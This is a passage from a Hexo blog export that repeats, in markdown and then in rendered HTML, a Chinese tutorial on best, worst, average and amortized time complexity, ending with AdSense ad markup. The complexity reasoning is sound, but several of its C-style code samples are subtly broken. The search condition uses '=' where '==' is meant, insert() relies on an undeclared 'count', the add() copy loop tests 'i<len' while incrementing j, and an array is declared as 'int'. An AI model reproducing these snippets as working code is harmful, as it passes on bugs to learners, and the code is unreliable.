%}\n</div> \n\n我们先用学过的知识试着分析以下代码的时间复杂度：\n\n```C\nint findArray(int[] arr, int n, int target){\n  int i = 0;\n  int pos = -1;\n\n  for(i; i<n; i++){\n    if(arr[i] = target){\n      pos = i;\n    }\n  }\n  return pos;\n}\n```\n\n上面代码实现的功能是在一个无序数组中，查找变量target的位置，如果找不到就返回-1，按照前面的分析方法，该段代码的时间复杂度为O(n)。\n\n但是我们在数组中查找一个数据，并不需要每次都把整个数组都遍历一遍，优化一下这段代码：\n\n```C\nint findArray(int[] arr, int n, int target){\n  int i = 0;\n  int pos = -1;\n\n  for(i; i<n; i++){\n    if(arr[i] = target){\n      pos = i;\n      break;\n    }\n  }\n  return pos;\n}\n```\n但是这时候问题来了，优化完之后，时间复杂度还是O(n)吗？\n\n因为要查找的变量target可能出现在数组的任何位置，如果要查找的target刚好出现在数组的开始位置，那么就不需要遍历剩余的数据，此时时间复杂度为O(1)。但是如果数组中不存在变量target，或者在最后一位，那我们就需要把整个数组都遍历一遍，时间复杂度就成了O(n)，所以这段代码在不同情况下时间复杂度是不同的。\n\n为了表示代码在不同情况下的时间复杂度，我们需要引入三个概念：**最好情况时间复杂度、最坏情况复杂度、平均时间复杂度**。\n\n顾名思义，最好情况时间复杂度就是，在最理想情况下，执行这段代码的时间复杂度。如上例中，在最理想情况下，查找的变量target刚好在第一个，这时候对应的时间复杂度就是最好情况时间复杂度。\n\n同理，最坏情况时间复杂度就是，在最糟糕的情况下，执行这段代码的时间复杂度，上例中，如果数组中没有要查找的变量target，我们需要把整个数组遍历一遍，所以最坏情况下对应的时间复杂度就是最坏情况复杂度。\n<div style=\"text-align: center;\">\n{% note success %} \n### 平均时间复杂度\n{% endnote %}\n</div> \n我们都知道，最好情况时间复杂度和最坏情况时间复杂度对应的都是极端情况下的代码复杂度，发生的概率并不大。为了更好的表示平均情况下的时间复杂度，我们引入一个概念：**平均情况时间复杂度，简称平均时间复杂度**。\n\n平均时间复杂度又该怎么分析呢？我们还是借助上面的例子。\n\n要查找的变量target在数组中的位置，有n+1中情况： 在数组0 ~ n-1位置 n种情况和不在数组中1个情况。我们把每种情况下，需要遍历的元素个数累加起来，然后在除以n+1，就可以得到需要遍历的元素个数的平均值，即：\n\n$$ \\frac{1+2+3+...+n+n}{n+1} = \\frac{n(n + 3)}{2(n + 1)} $$\n\n我们知道，时间复杂度大O标记法中，可以省略掉系数、低阶、常量，所以上面的时间复杂度为O(n)。\n\n这个结论虽然是正确的，但是计算过程稍微有点问题。我们刚讲的这n+1中情况，出现的概率并不一样。下面结合概率论的知识分析一下。\n\n我们知道，要查找的变量x，要么在数组中，要么不再数组中，我们假设这两个概率分布为$\\frac{1}{2}$。\n\n不在数组中时，时间复杂度为: <font color=red>$n\\times\\frac{1}{2}$</font>; 在数组中时，因为数组大小为n，出现在任何一个位置的可能性都是一样的，所以每个位置的概率就是:<font color=red>$\\frac{1}{2n}$</font>, 因此在数组中时的时间复杂度为：<font color=red>$(1+2+3+...+n)\\times\\frac{1}{2n} $</font>。\n\n\n那平均时间复杂度就是：<font color=red>$(1+2+3+...+n)\\times\\frac{1}{2n} + n\\times\\frac{1}{2} = \\frac{3n+1}{4} = O(n)$</font>。\n\n这个值就是概率论中的加权平均值，也叫做期望值，所以平均时间复杂度也叫做**加权平均时间复杂度**或者**期望时间复杂度**。\n\n实际上，在大多情况下我们并不需要区分最好、最坏、平均时间复杂度三种情况，很多时候我们只用一个复杂度就可以满足需求了。只有同一代码在不同的情况下，时间复杂度有量级的差距，我们才会使用三种复杂度表示法来区分。\n<div style=\"text-align: center;\">\n{% note success %} \n### 均摊时间复杂度\n{% endnote %}\n</div> \n目前为止，我们应该已经掌握了算法复杂度分析的大部分内容了，下面来认识一个更高级的概念：**均摊时间复杂度**，以及它对应的分析方法**摊还分析**。\n\n均摊时间复杂度听起来跟平均时间复杂度有点像，对于初学者来说，这两个概念很容易弄混。前面说过，大部分情况下不需要区分最好、最坏、平均时间复杂度，只有某些特殊情况才需要平均时间复杂度，而均摊时间复杂度比它的应用场景比它更特殊、更有限。\n\n还是以一个例子来说明(别太在意例子，只是为了说明)：\n\n```C\nint[] arr = new int[n];\nint size = 0；\n\nvoid insert(int val){\n  // 如果数组满了\n  if(count == arr.length){\n    int sum = 0;\n    for(int i=0; i<arr.length;i++){\n      sum = sum + arr[i];\n    }\n    arr[0] = sum;\n    count = 1;\n  }\n  // 数组赋值\n  arr[count] = val;\n  ++count;\n}\n```\n先简单解释一下这段代码的功能，这段代码实现了一个往数组中插入数据的功能，如果数组有空闲空间，直接插入即可。如果数组满了，将数组中的数据求和，清空数组，将求和之后的数据放入数组的第一个位置，然后再将新的数据插入。\n\n那这段代码的时间复杂度是多少呢？我们可以先利用上面讲的三种分析方法来分析一下。\n\n最理想情况下，数组有空闲空间，直接插入数据就可以，所以最好时间复杂度为O(1)；最坏情况下，数组中没有空闲空间了，我们需要先进行一次数组遍历求和，在做数据插入，所以最坏情况时间复杂度为O(n)；平均情况时间复杂度，我们还是用概率论的方法来分析，假设数组长度为n，根据插入位置不同，可以分为n种情况，每种情况的时间复杂度为O(1)，另外还有一种特殊情况，就是数组没有空闲时间时，时间复杂度为O(n)，而且这n+1中情况出现的概率是一样的，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +....+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。\n\n我们来比较一下这个例子中insert函数和上面findArray的不同。首先，findArray在极端情况下，复杂度才为O(1)，大部分情况都为O(n)，而insert函数大部分情况时间复杂度都为O(1)，只有特殊情况时间复杂度才为O(n)，这是第一个区别。第二个不同的地方，对于insert函数来说，O(1)和O(n)的时间复杂度出现的频率是非常有规律的，而且有一定的时序关系，一般都是一个O(n)插入之后，跟n-1个O(1)的插入操作，循环往复。\n\n针对这样一种情况，我们并不需要像平均复杂度分析那样，计算所有输入情况和发生的概率，计算加权平均值。 我们引入一种更加简单的分析方法：**摊还分析法**，通过摊还分析得到的时间复杂度我们起了一个名字叫：**摊还时间复杂度**。\n\n那么究竟如何使用摊还分析法来分析算法的均摊时间复杂度呢？\n\n我们还是以这个insert函数为例，每一次O(n)的插入操作，后面都会跟n-1次O(1)插入操作，所以我们把耗时最多的操作均摊到n-1次耗时少的操作上，均摊下来，这一组连续操作的均摊时间复杂度就为O(1)，这就是均摊分析法的大致思路。\n\n均摊时间复杂度和摊还分析应用场景比较特殊，所以不会经常用到，这里简单总结一下他们的应用场景。\n\n对一个数据结构进行一组连续操作中，大部分情况下时间复杂度都很低，只有个别情况下时间复杂度比较高，而且这些操作之间存在前后连贯的时序关系，这个时候，我们就可以将这一组操作放在一块分析，看看是否能将时间复杂度高的操作，均摊到其他时间复杂度低的操作上。在一般的能运用均摊时间复杂度的场景中，均摊时间复杂度是等于最好时间复杂度的。\n\n\n### 思考题：\n\n根据今天学习的几个复杂度分析的方法，来分析一下下面这个add()函数的时间复杂度。\n\n```C\nint[] arr = new int[10];\nint len = 10;\nint i=0;\n\nvoid add(int element){\n  // 数组空间满了\n  if(i>=len){\n    // 数组扩容\n    int new_arr = new int[len*2];\n    // 把数组拷贝到新数组\n    for(int j=0; i<len; j++){\n      new_arr[j] = arr[j];\n    }\n    arr = new_arr;\n    len = len*2;\n  }\n  // 添加到数组中\n  arr[i] = element;\n  ++i;\n}\n```\n\n**分析：**在最理想情况下，数组中有空闲空间，可以直接添加到数组中，时间复杂度为O(1)；最坏情况下，数组中没有空闲空间，先进行一次扩容操作，在进行遍历给新数组赋值，时间复杂度为O(n)，所以最坏时间复杂度为O(n)。\n\n平均时间复杂度，可以分为有空闲空间和没有空闲空间两种，有空间空间有n中情况，所以每种情况出现的概率为$\\frac{1}{n+1}$，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +....+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。\n\n均摊时间复杂度，可以看出本例是符合均摊时间复杂度的场景的，在一次O(n)时间复杂度操作后都会跟n-1次O(1)时间复杂度操作，所以将O(n)时间复杂度的操作均摊到n-1次O(1)时间复杂度操作上，最终均摊时间复杂度为O(1)。\n\n\n\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-最好、最坏、平均、均摊时间复杂度.md","raw":"---\ntitle: 算法-最好、最坏、平均、均摊时间复杂度\ndate: 2018-09-09 00:18:36\ntags: ['算法','复杂度分析']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n前面我们讲过复杂度的大O表示法和几个分析技巧，还举了一些复杂度分析的例子，掌握了这些内容，对于复杂度分析这个知识点，已经达到及格线了。\n\n这篇会着重讲一下复杂度分析的四个复杂度分析方面的知识：\n<font color=red>**最好时间情况复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度**</font>。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 最好、最坏时间复杂度\n{% endnote %}\n</div> \n\n我们先用学过的知识试着分析以下代码的时间复杂度：\n\n```C\nint findArray(int[] arr, int n, int target){\n  int i = 0;\n  int pos = -1;\n\n  for(i; i<n; i++){\n    if(arr[i] = target){\n      pos = i;\n    }\n  }\n  return pos;\n}\n```\n\n上面代码实现的功能是在一个无序数组中，查找变量target的位置，如果找不到就返回-1，按照前面的分析方法，该段代码的时间复杂度为O(n)。\n\n但是我们在数组中查找一个数据，并不需要每次都把整个数组都遍历一遍，优化一下这段代码：\n\n```C\nint findArray(int[] arr, int n, int target){\n  int i = 0;\n  int pos = -1;\n\n  for(i; i<n; i++){\n    if(arr[i] = target){\n      pos = i;\n      break;\n    }\n  }\n  return pos;\n}\n```\n但是这时候问题来了，优化完之后，时间复杂度还是O(n)吗？\n\n因为要查找的变量target可能出现在数组的任何位置，如果要查找的target刚好出现在数组的开始位置，那么就不需要遍历剩余的数据，此时时间复杂度为O(1)。但是如果数组中不存在变量target，或者在最后一位，那我们就需要把整个数组都遍历一遍，时间复杂度就成了O(n)，所以这段代码在不同情况下时间复杂度是不同的。\n\n为了表示代码在不同情况下的时间复杂度，我们需要引入三个概念：**最好情况时间复杂度、最坏情况复杂度、平均时间复杂度**。\n\n顾名思义，最好情况时间复杂度就是，在最理想情况下，执行这段代码的时间复杂度。如上例中，在最理想情况下，查找的变量target刚好在第一个，这时候对应的时间复杂度就是最好情况时间复杂度。\n\n同理，最坏情况时间复杂度就是，在最糟糕的情况下，执行这段代码的时间复杂度，上例中，如果数组中没有要查找的变量target，我们需要把整个数组遍历一遍，所以最坏情况下对应的时间复杂度就是最坏情况复杂度。\n<div style=\"text-align: center;\">\n{% note success %} \n### 平均时间复杂度\n{% endnote %}\n</div> \n我们都知道，最好情况时间复杂度和最坏情况时间复杂度对应的都是极端情况下的代码复杂度，发生的概率并不大。为了更好的表示平均情况下的时间复杂度，我们引入一个概念：**平均情况时间复杂度，简称平均时间复杂度**。\n\n平均时间复杂度又该怎么分析呢？我们还是借助上面的例子。\n\n要查找的变量target在数组中的位置，有n+1中情况： 在数组0 ~ n-1位置 n种情况和不在数组中1个情况。我们把每种情况下，需要遍历的元素个数累加起来，然后在除以n+1，就可以得到需要遍历的元素个数的平均值，即：\n\n$$ \\frac{1+2+3+...+n+n}{n+1} = \\frac{n(n + 3)}{2(n + 1)} $$\n\n我们知道，时间复杂度大O标记法中，可以省略掉系数、低阶、常量，所以上面的时间复杂度为O(n)。\n\n这个结论虽然是正确的，但是计算过程稍微有点问题。我们刚讲的这n+1中情况，出现的概率并不一样。下面结合概率论的知识分析一下。\n\n我们知道，要查找的变量x，要么在数组中，要么不再数组中，我们假设这两个概率分布为$\\frac{1}{2}$。\n\n不在数组中时，时间复杂度为: <font color=red>$n\\times\\frac{1}{2}$</font>; 在数组中时，因为数组大小为n，出现在任何一个位置的可能性都是一样的，所以每个位置的概率就是:<font color=red>$\\frac{1}{2n}$</font>, 因此在数组中时的时间复杂度为：<font color=red>$(1+2+3+...+n)\\times\\frac{1}{2n} $</font>。\n\n\n那平均时间复杂度就是：<font color=red>$(1+2+3+...+n)\\times\\frac{1}{2n} + n\\times\\frac{1}{2} = \\frac{3n+1}{4} = O(n)$</font>。\n\n这个值就是概率论中的加权平均值，也叫做期望值，所以平均时间复杂度也叫做**加权平均时间复杂度**或者**期望时间复杂度**。\n\n实际上，在大多情况下我们并不需要区分最好、最坏、平均时间复杂度三种情况，很多时候我们只用一个复杂度就可以满足需求了。只有同一代码在不同的情况下，时间复杂度有量级的差距，我们才会使用三种复杂度表示法来区分。\n<div style=\"text-align: center;\">\n{% note success %} \n### 均摊时间复杂度\n{% endnote %}\n</div> \n目前为止，我们应该已经掌握了算法复杂度分析的大部分内容了，下面来认识一个更高级的概念：**均摊时间复杂度**，以及它对应的分析方法**摊还分析**。\n\n均摊时间复杂度听起来跟平均时间复杂度有点像，对于初学者来说，这两个概念很容易弄混。前面说过，大部分情况下不需要区分最好、最坏、平均时间复杂度，只有某些特殊情况才需要平均时间复杂度，而均摊时间复杂度比它的应用场景比它更特殊、更有限。\n\n还是以一个例子来说明(别太在意例子，只是为了说明)：\n\n```C\nint[] arr = new int[n];\nint size = 0；\n\nvoid insert(int val){\n  // 如果数组满了\n  if(count == arr.length){\n    int sum = 0;\n    for(int i=0; i<arr.length;i++){\n      sum = sum + arr[i];\n    }\n    arr[0] = sum;\n    count = 1;\n  }\n  // 数组赋值\n  arr[count] = val;\n  ++count;\n}\n```\n先简单解释一下这段代码的功能，这段代码实现了一个往数组中插入数据的功能，如果数组有空闲空间，直接插入即可。如果数组满了，将数组中的数据求和，清空数组，将求和之后的数据放入数组的第一个位置，然后再将新的数据插入。\n\n那这段代码的时间复杂度是多少呢？我们可以先利用上面讲的三种分析方法来分析一下。\n\n最理想情况下，数组有空闲空间，直接插入数据就可以，所以最好时间复杂度为O(1)；最坏情况下，数组中没有空闲空间了，我们需要先进行一次数组遍历求和，在做数据插入，所以最坏情况时间复杂度为O(n)；平均情况时间复杂度，我们还是用概率论的方法来分析，假设数组长度为n，根据插入位置不同，可以分为n种情况，每种情况的时间复杂度为O(1)，另外还有一种特殊情况，就是数组没有空闲时间时，时间复杂度为O(n)，而且这n+1中情况出现的概率是一样的，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +....+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。\n\n我们来比较一下这个例子中insert函数和上面findArray的不同。首先，findArray在极端情况下，复杂度才为O(1)，大部分情况都为O(n)，而insert函数大部分情况时间复杂度都为O(1)，只有特殊情况时间复杂度才为O(n)，这是第一个区别。第二个不同的地方，对于insert函数来说，O(1)和O(n)的时间复杂度出现的频率是非常有规律的，而且有一定的时序关系，一般都是一个O(n)插入之后，跟n-1个O(1)的插入操作，循环往复。\n\n针对这样一种情况，我们并不需要像平均复杂度分析那样，计算所有输入情况和发生的概率，计算加权平均值。 我们引入一种更加简单的分析方法：**摊还分析法**，通过摊还分析得到的时间复杂度我们起了一个名字叫：**摊还时间复杂度**。\n\n那么究竟如何使用摊还分析法来分析算法的均摊时间复杂度呢？\n\n我们还是以这个insert函数为例，每一次O(n)的插入操作，后面都会跟n-1次O(1)插入操作，所以我们把耗时最多的操作均摊到n-1次耗时少的操作上，均摊下来，这一组连续操作的均摊时间复杂度就为O(1)，这就是均摊分析法的大致思路。\n\n均摊时间复杂度和摊还分析应用场景比较特殊，所以不会经常用到，这里简单总结一下他们的应用场景。\n\n对一个数据结构进行一组连续操作中，大部分情况下时间复杂度都很低，只有个别情况下时间复杂度比较高，而且这些操作之间存在前后连贯的时序关系，这个时候，我们就可以将这一组操作放在一块分析，看看是否能将时间复杂度高的操作，均摊到其他时间复杂度低的操作上。在一般的能运用均摊时间复杂度的场景中，均摊时间复杂度是等于最好时间复杂度的。\n\n\n### 思考题：\n\n根据今天学习的几个复杂度分析的方法，来分析一下下面这个add()函数的时间复杂度。\n\n```C\nint[] arr = new int[10];\nint len = 10;\nint i=0;\n\nvoid add(int element){\n  // 数组空间满了\n  if(i>=len){\n    // 数组扩容\n    int new_arr = new int[len*2];\n    // 把数组拷贝到新数组\n    for(int j=0; i<len; j++){\n      new_arr[j] = arr[j];\n    }\n    arr = new_arr;\n    len = len*2;\n  }\n  // 添加到数组中\n  arr[i] = element;\n  ++i;\n}\n```\n\n**分析：**在最理想情况下，数组中有空闲空间，可以直接添加到数组中，时间复杂度为O(1)；最坏情况下，数组中没有空闲空间，先进行一次扩容操作，在进行遍历给新数组赋值，时间复杂度为O(n)，所以最坏时间复杂度为O(n)。\n\n平均时间复杂度，可以分为有空闲空间和没有空闲空间两种，有空间空间有n中情况，所以每种情况出现的概率为$\\frac{1}{n+1}$，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +....+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。\n\n均摊时间复杂度，可以看出本例是符合均摊时间复杂度的场景的，在一次O(n)时间复杂度操作后都会跟n-1次O(1)时间复杂度操作，所以将O(n)时间复杂度的操作均摊到n-1次O(1)时间复杂度操作上，最终均摊时间复杂度为O(1)。\n\n\n\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-最好、最坏、平均、均摊时间复杂度","published":1,"updated":"2018-11-29T09:59:50.776Z","_id":"cjpdmv0b1002t4cv0fa6vtc1z","comments":1,"layout":"post","photos":[],"link":"","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>前面我们讲过复杂度的大O表示法和几个分析技巧，还举了一些复杂度分析的例子，掌握了这些内容，对于复杂度分析这个知识点，已经达到及格线了。</p>\n<p>这篇会着重讲一下复杂度分析的四个复杂度分析方面的知识：</p>\n<p><font color=\"red\"><strong>最好时间情况复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度</strong></font>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"最好、最坏时间复杂度\"><a href=\"#最好、最坏时间复杂度\" class=\"headerlink\" title=\"最好、最坏时间复杂度\"></a>最好、最坏时间复杂度</h3></div><br></div> \n\n<p>我们先用学过的知识试着分析以下代码的时间复杂度：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">findArray</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> target)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> pos = <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>(i; i&lt;n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(arr[i] = target)&#123;</span><br><span class=\"line\">      pos = i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> pos;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面代码实现的功能是在一个无序数组中，查找变量target的位置，如果找不到就返回-1，按照前面的分析方法，该段代码的时间复杂度为O(n)。</p>\n<p>但是我们在数组中查找一个数据，并不需要每次都把整个数组都遍历一遍，优化一下这段代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">findArray</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> target)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> pos = <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>(i; i&lt;n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(arr[i] = target)&#123;</span><br><span class=\"line\">      pos = i;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> pos;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但是这时候问题来了，优化完之后，时间复杂度还是O(n)吗？</p>\n<p>因为要查找的变量target可能出现在数组的任何位置，如果要查找的target刚好出现在数组的开始位置，那么就不需要遍历剩余的数据，此时时间复杂度为O(1)。但是如果数组中不存在变量target，或者在最后一位，那我们就需要把整个数组都遍历一遍，时间复杂度就成了O(n)，所以这段代码在不同情况下时间复杂度是不同的。</p>\n<p>为了表示代码在不同情况下的时间复杂度，我们需要引入三个概念：<strong>最好情况时间复杂度、最坏情况复杂度、平均时间复杂度</strong>。</p>\n<p>顾名思义，最好情况时间复杂度就是，在最理想情况下，执行这段代码的时间复杂度。如上例中，在最理想情况下，查找的变量target刚好在第一个，这时候对应的时间复杂度就是最好情况时间复杂度。</p>\n<p>同理，最坏情况时间复杂度就是，在最糟糕的情况下，执行这段代码的时间复杂度，上例中，如果数组中没有要查找的变量target，我们需要把整个数组遍历一遍，所以最坏情况下对应的时间复杂度就是最坏情况复杂度。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"平均时间复杂度\"><a href=\"#平均时间复杂度\" class=\"headerlink\" title=\"平均时间复杂度\"></a>平均时间复杂度</h3></div><br></div><br>我们都知道，最好情况时间复杂度和最坏情况时间复杂度对应的都是极端情况下的代码复杂度，发生的概率并不大。为了更好的表示平均情况下的时间复杂度，我们引入一个概念：<strong>平均情况时间复杂度，简称平均时间复杂度</strong>。</p>\n<p>平均时间复杂度又该怎么分析呢？我们还是借助上面的例子。</p>\n<p>要查找的变量target在数组中的位置，有n+1中情况： 在数组0 ~ n-1位置 n种情况和不在数组中1个情况。我们把每种情况下，需要遍历的元素个数累加起来，然后在除以n+1，就可以得到需要遍历的元素个数的平均值，即：</p>\n<p>$$ \\frac{1+2+3+…+n+n}{n+1} = \\frac{n(n + 3)}{2(n + 1)} $$</p>\n<p>我们知道，时间复杂度大O标记法中，可以省略掉系数、低阶、常量，所以上面的时间复杂度为O(n)。</p>\n<p>这个结论虽然是正确的，但是计算过程稍微有点问题。我们刚讲的这n+1中情况，出现的概率并不一样。下面结合概率论的知识分析一下。</p>\n<p>我们知道，要查找的变量x，要么在数组中，要么不再数组中，我们假设这两个概率分布为$\\frac{1}{2}$。</p>\n<p>不在数组中时，时间复杂度为: <font color=\"red\">$n\\times\\frac{1}{2}$</font>; 在数组中时，因为数组大小为n，出现在任何一个位置的可能性都是一样的，所以每个位置的概率就是:<font color=\"red\">$\\frac{1}{2n}$</font>, 因此在数组中时的时间复杂度为：<font color=\"red\">$(1+2+3+…+n)\\times\\frac{1}{2n} $</font>。</p>\n<p>那平均时间复杂度就是：<font color=\"red\">$(1+2+3+…+n)\\times\\frac{1}{2n} + n\\times\\frac{1}{2} = \\frac{3n+1}{4} = O(n)$</font>。</p>\n<p>这个值就是概率论中的加权平均值，也叫做期望值，所以平均时间复杂度也叫做<strong>加权平均时间复杂度</strong>或者<strong>期望时间复杂度</strong>。</p>\n<p>实际上，在大多情况下我们并不需要区分最好、最坏、平均时间复杂度三种情况，很多时候我们只用一个复杂度就可以满足需求了。只有同一代码在不同的情况下，时间复杂度有量级的差距，我们才会使用三种复杂度表示法来区分。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"均摊时间复杂度\"><a href=\"#均摊时间复杂度\" class=\"headerlink\" title=\"均摊时间复杂度\"></a>均摊时间复杂度</h3></div><br></div><br>目前为止，我们应该已经掌握了算法复杂度分析的大部分内容了，下面来认识一个更高级的概念：<strong>均摊时间复杂度</strong>，以及它对应的分析方法<strong>摊还分析</strong>。</p>\n<p>均摊时间复杂度听起来跟平均时间复杂度有点像，对于初学者来说，这两个概念很容易弄混。前面说过，大部分情况下不需要区分最好、最坏、平均时间复杂度，只有某些特殊情况才需要平均时间复杂度，而均摊时间复杂度比它的应用场景比它更特殊、更有限。</p>\n<p>还是以一个例子来说明(别太在意例子，只是为了说明)：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>[] arr = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[n];</span><br><span class=\"line\"><span class=\"keyword\">int</span> size = <span class=\"number\">0</span>；</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> insert(<span class=\"keyword\">int</span> val)&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 如果数组满了</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(count == arr.length)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>; i&lt;arr.length;i++)&#123;</span><br><span class=\"line\">      sum = sum + arr[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    arr[<span class=\"number\">0</span>] = sum;</span><br><span class=\"line\">    count = <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 数组赋值</span></span><br><span class=\"line\">  arr[count] = val;</span><br><span class=\"line\">  ++count;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>先简单解释一下这段代码的功能，这段代码实现了一个往数组中插入数据的功能，如果数组有空闲空间，直接插入即可。如果数组满了，将数组中的数据求和，清空数组，将求和之后的数据放入数组的第一个位置，然后再将新的数据插入。</p>\n<p>那这段代码的时间复杂度是多少呢？我们可以先利用上面讲的三种分析方法来分析一下。</p>\n<p>最理想情况下，数组有空闲空间，直接插入数据就可以，所以最好时间复杂度为O(1)；最坏情况下，数组中没有空闲空间了，我们需要先进行一次数组遍历求和，在做数据插入，所以最坏情况时间复杂度为O(n)；平均情况时间复杂度，我们还是用概率论的方法来分析，假设数组长度为n，根据插入位置不同，可以分为n种情况，每种情况的时间复杂度为O(1)，另外还有一种特殊情况，就是数组没有空闲时间时，时间复杂度为O(n)，而且这n+1中情况出现的概率是一样的，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +….+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。</p>\n<p>我们来比较一下这个例子中insert函数和上面findArray的不同。首先，findArray在极端情况下，复杂度才为O(1)，大部分情况都为O(n)，而insert函数大部分情况时间复杂度都为O(1)，只有特殊情况时间复杂度才为O(n)，这是第一个区别。第二个不同的地方，对于insert函数来说，O(1)和O(n)的时间复杂度出现的频率是非常有规律的，而且有一定的时序关系，一般都是一个O(n)插入之后，跟n-1个O(1)的插入操作，循环往复。</p>\n<p>针对这样一种情况，我们并不需要像平均复杂度分析那样，计算所有输入情况和发生的概率，计算加权平均值。 